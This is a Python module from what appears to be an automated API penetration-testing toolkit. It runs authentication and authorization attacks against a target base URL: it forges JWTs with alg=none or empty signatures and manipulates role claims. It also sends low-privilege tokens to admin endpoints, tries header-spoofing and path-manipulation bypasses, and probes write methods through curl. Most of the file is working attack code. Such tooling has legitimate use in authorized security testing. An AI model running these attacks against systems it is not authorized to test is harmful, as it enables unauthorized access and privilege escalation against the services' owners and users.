#!/usr/bin/env python3
"""atest Phase 2: AuthN/AuthZ automated testing — JWT attacks, role escalation, token scope abuse.

Usage:
    from phase2_authz import run
    results = run(base_url="https://api.target.com",
                  token_user="eyJ...",      # Low-priv user
                  token_admin="eyJ...",     # Admin (if available, for comparison)
                  endpoints=["/api/users", "/api/admin/users", "/api/settings"])
"""
import json
import base64
import re
from hermes_tools import terminal, write_file


def _curl(url, method="GET", headers=None, body=None, timeout=10):
    """Execute curl, return (status_code, body, response_headers)."""
    cmd = f'curl -sk -w "\\n---HTTP_CODE:%{{http_code}}---" -X {method} --max-time {timeout}'
    cmd += ' -D /tmp/authz_headers.txt'
    if headers:
        for k, v in headers.items():
            cmd += f' -H "{k}: {v}"'
    if body:
        escaped = body.replace("'", "'\\''")
        cmd += f" -d '{escaped}'"
    cmd += f' "{url}"'
    resp = terminal(cmd, timeout=timeout + 5)
    output = resp.get("output", "")
    code_match = re.search(r'---HTTP_CODE:(\d+)---', output)
    code = code_match.group(1) if code_match else "000"
    resp_body = re.sub(r'\n---HTTP_CODE:\d+---$', '', output)
    h = terminal("cat /tmp/authz_headers.txt 2>/dev/null", timeout=3)
    return code, resp_body, h.get("output", "")


def _decode_jwt(token):
    """Decode JWT without verification."""
    parts = token.split(".")
    if len(parts) != 3:
        return None, None
    try:
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        return header, payload
    except Exception:
        return None, None


def _forge_jwt_none(payload_dict):
    """Create JWT with alg=none."""
    header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b"=").decode()
    return f"{header}.{payload}."


def _forge_jwt_hs256(original_token, new_payload=None, new_header=None):
    """Create JWT with HS256 using public key as HMAC secret (alg confusion RS→HS)."""
    # Returns the forged token structure — actual signing needs the public key
    parts = original_token.split(".")
    header = new_header or {"alg": "HS256", "typ": "JWT"}
    _, orig_payload = _decode_jwt(original_token)
    payload = new_payload or orig_payload
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    return f"{h}.{p}.fakesig"


def test_jwt_attacks(base_url, token, test_endpoint="/api/me"):
    """Test JWT-specific weaknesses."""
    findings = []
    header, payload = _decode_jwt(token)
    if not header:
        return [{"type": "jwt_decode_failed", "detail": "Token is not a valid JWT"}]

    print(f"  JWT alg={header.get('alg')}, claims: {list(payload.keys())}")

    # 1. None algorithm
    none_token = _forge_jwt_none(payload)
    code, body, _ = _curl(f"{base_url}{test_endpoint}",
                          headers={"Authorization": f"Bearer {none_token}", "Content-Type": "application/json"})
    if code == "200":
        findings.append({"type": "jwt_none_alg", "severity": "critical",
                         "detail": f"JWT none algorithm accepted on {test_endpoint}",
                         "evidence": f"Status {code}, body: {body[:200]}"})
        print(f"    🔴 CRITICAL: none algorithm accepted!")

    # 2. Empty signature
    parts = token.split(".")
    empty_sig_token = f"{parts[0]}.{parts[1]}."
    code, body, _ = _curl(f"{base_url}{test_endpoint}",
                          headers={"Authorization": f"Bearer {empty_sig_token}", "Content-Type": "application/json"})
    if code == "200":
        findings.append({"type": "jwt_empty_sig", "severity": "high",
                         "detail": "JWT with empty signature accepted"})
        print(f"    🔴 HIGH: Empty signature accepted!")

    # 3. Role/claim manipulation (if role/admin fields exist)
    escalated_payload = dict(payload)
    role_fields = [k for k in payload if k.lower() in ("role", "roles", "is_admin", "admin", "scope", "permissions", "groups")]
    if role_fields:
        for field in role_fields:
            if isinstance(payload[field], bool):
                escalated_payload[field] = True
            elif isinstance(payload[field], str):
                escalated_payload[field] = "admin"
            elif isinstance(payload[field], list):
                escalated_payload[field] = payload[field] + ["admin"]
        # Can't actually sign this without key, but record the opportunity
        findings.append({"type": "jwt_role_field_present", "severity": "info",
                         "detail": f"Role fields in JWT: {role_fields} — test with alg confusion or weak secret"})
        print(f"    ℹ️  Role fields found: {role_fields}")

    # 4. Algorithm confusion (RS256 → HS256)
    if header.get("alg", "").startswith("RS"):
        findings.append({"type": "jwt_alg_confusion_candidate", "severity": "info",
                         "detail": f"Token uses {header['alg']} — test RS→HS confusion with public key as HMAC secret"})
        print(f"    ℹ️  RS→HS confusion candidate (need public key)")

    # 5. Expired token still accepted (if exp claim exists)
    if "exp" in payload:
        expired_payload = dict(payload)
        expired_payload["exp"] = 1000000000  # Year 2001
        # Can't sign, but test if current token with very old exp works after modification
        findings.append({"type": "jwt_exp_check", "severity": "info",
                         "detail": f"Token has exp claim — verify expiry is enforced"})

    return findings


def test_vertical_escalation(base_url, token_user, admin_endpoints, auth_header="Authorization", auth_prefix="Bearer"):
    """Test if low-privilege token can access admin endpoints."""
    findings = []
    print(f"\n  Vertical Escalation: testing {len(admin_endpoints)} admin endpoints with user token")

    for ep in admin_endpoints:
        url = f"{base_url}{ep}"
        code, body, _ = _curl(url, headers={auth_header: f"{auth_prefix} {token_user}", "Content-Type": "application/json"})
        if code == "200":
            findings.append({"type": "vertical_escalation", "severity": "high",
                             "endpoint": ep, "detail": f"User token got 200 on admin endpoint",
                             "evidence": body[:200]})
            print(f"    🔴 HIGH: {ep} → 200 (user token on admin endpoint!)")
        elif code in ("401", "403"):
            print(f"    ✓ {ep} → {code} (protected)")
        else:
            print(f"    ? {ep} → {code}")

    return findings


def test_token_scope(base_url, token, endpoints, methods=("GET", "POST", "PUT", "DELETE")):
    """Test if token works on endpoints/methods it shouldn't."""
    findings = []
    print(f"\n  Token Scope: testing {len(endpoints)} endpoints × {len(methods)} methods")

    for ep in endpoints:
        for method in methods:
            url = f"{base_url}{ep}"
            code, body, _ = _curl(url, method=method,
                                  headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
                                  body='{"test":"scope"}' if method in ("POST", "PUT") else None)
            if code == "200" and method in ("PUT", "DELETE", "POST"):
                findings.append({"type": "excess_scope", "severity": "medium",
                                 "endpoint": f"{method} {ep}", "detail": f"Write operation allowed",
                                 "evidence": body[:150]})
                print(f"    ⚠️  {method} {ep} → 200 (write allowed)")

    return findings


def test_auth_bypass_headers(base_url, endpoint, token):
    """Test common auth bypass techniques."""
    findings = []
    bypasses = [
        # No token
        ({}, "No auth header"),
        # Internal network headers
        ({"X-Forwarded-For": "127.0.0.1", "Authorization": f"Bearer {token}"}, "X-Forwarded-For: 127.0.0.1"),
        ({"X-Original-URL": endpoint, "Authorization": f"Bearer invalid"}, "X-Original-URL override"),
        ({"X-Rewrite-URL": endpoint, "Authorization": f"Bearer invalid"}, "X-Rewrite-URL override"),
        # Method override
        ({"X-HTTP-Method-Override": "GET", "Authorization": f"Bearer invalid"}, "X-HTTP-Method-Override"),
        # API versioning bypass
        ({}, "path manipulation"),
    ]

    print(f"\n  Auth Bypass Headers: testing {endpoint}")

    # No token
    code, body, _ = _curl(f"{base_url}{endpoint}")
    if code == "200":
        findings.append({"type": "no_auth_required", "severity": "high",
                         "endpoint": endpoint, "detail": "Endpoint accessible without any token"})
        print(f"    🔴 HIGH: No auth required!")
        return findings  # Already broken, skip other tests

    # Header-based bypasses
    for headers, desc in bypasses[1:5]:
        code, body, _ = _curl(f"{base_url}{endpoint}", headers=headers)
        if code == "200":
            findings.append({"type": "auth_bypass_header", "severity": "high",
                             "endpoint": endpoint, "detail": f"Bypass via: {desc}"})
            print(f"    🔴 HIGH: Bypass via {desc}!")

    # Path manipulation
    path_variants = [
        endpoint + "/",
        endpoint + "?",
        endpoint + "#",
        endpoint + "%20",
        endpoint + "/..",
        endpoint.replace("/api/", "/API/"),
        endpoint.replace("/api/", "/Api/"),
        "/." + endpoint,
        "/%2e" + endpoint,
    ]
    for variant in path_variants:
        code, body, _ = _curl(f"{base_url}{variant}",
                              headers={"Authorization": "Bearer invalid"})
        if code == "200":
            findings.append({"type": "auth_bypass_path", "severity": "high",
                             "endpoint": endpoint, "detail": f"Bypass via path: {variant}"})
            print(f"    🔴 HIGH: Path bypass: {variant}")
            break

    if not findings:
        print(f"    ✓ No bypasses found")

    return findings


def run(base_url, token_user, endpoints, token_admin=None, test_endpoint="/api/me",
        admin_endpoints=None, auth_header="Authorization", auth_prefix="Bearer",
        output_dir="./atest-output/phase2-authz"):
    """
    Full Phase 2 auth testing pipeline.

    Args:
        base_url: API base URL
        token_user: Low-privilege user token
        endpoints: All discovered endpoints
        token_admin: Admin token (optional, for comparison)
        test_endpoint: Endpoint to validate JWT attacks against
        admin_endpoints: Endpoints expected to be admin-only
        auth_header/auth_prefix: Auth mechanism
        output_dir: Where to write results
    """
    if admin_endpoints is None:
        admin_endpoints = [ep for ep in endpoints if any(k in ep.lower() for k in
                          ["admin", "manage", "internal", "config", "setting", "role", "permission", "user"])]

    print("=" * 60)
    print("atest Phase 2: AuthN/AuthZ Testing")
    print(f"  Base: {base_url}")
    print(f"  Endpoints: {len(endpoints)} total, {len(admin_endpoints)} admin-like")
    print("=" * 60)

    all_findings = []

    # 1. JWT attacks
    print("\n[1] JWT Weakness Testing")
    jwt_findings = test_jwt_attacks(base_url, token_user, test_endpoint)
    all_findings.extend(jwt_findings)

    # 2. Vertical escalation
    if admin_endpoints:
        print("\n[2] Vertical Privilege Escalation")
        vert_findings = test_vertical_escalation(base_url, token_user, admin_endpoints, auth_header, auth_prefix)
        all_findings.extend(vert_findings)

    # 3. Auth bypass on sensitive endpoints
    print("\n[3] Auth Bypass Techniques")
    sensitive = admin_endpoints[:5] if admin_endpoints else endpoints[:5]
    for ep in sensitive:
        bypass_findings = test_auth_bypass_headers(base_url, ep, token_user)
        all_findings.extend(bypass_findings)

    # 4. Token scope (write methods on read-only endpoints)
    print("\n[4] Token Scope Testing")
    scope_findings = test_token_scope(base_url, token_user, endpoints[:10])
    all_findings.extend(scope_findings)

    # Summary
    print(f"\n{'='*60}")
    print(f"RESULTS: {len(all_findings)} findings")
    crits = [f for f in all_findings if f.get("severity") == "critical"]
    highs = [f for f in all_findings if f.get("severity") == "high"]
    meds = [f for f in all_findings if f.get("severity") == "medium"]
    print(f"  Critical: {len(crits)} | High: {len(highs)} | Medium: {len(meds)}")

    # Apply confidence scoring
    try:
        from confidence import score_finding, summary_with_confidence
        for f in all_findings:
            if "confidence" not in f:
                f["confidence"] = score_finding(f)
        conf_summary = summary_with_confidence(all_findings)
        print(f"  Confidence: {conf_summary['high_confidence']} high, "
              f"{conf_summary['medium_confidence']} medium, {conf_summary['low_confidence']} low")
        print(f"  Submit-ready: {conf_summary['high_confidence']} findings")
    except ImportError:
        pass

    # Write output
    terminal(f"mkdir -p {output_dir}", timeout=5)
    write_file(f"{output_dir}/authz-findings.json", json.dumps(all_findings, indent=2))

    return {"findings": all_findings, "summary": f"{len(crits)}C/{len(highs)}H/{len(meds)}M"}


if __name__ == "__main__":
    pass
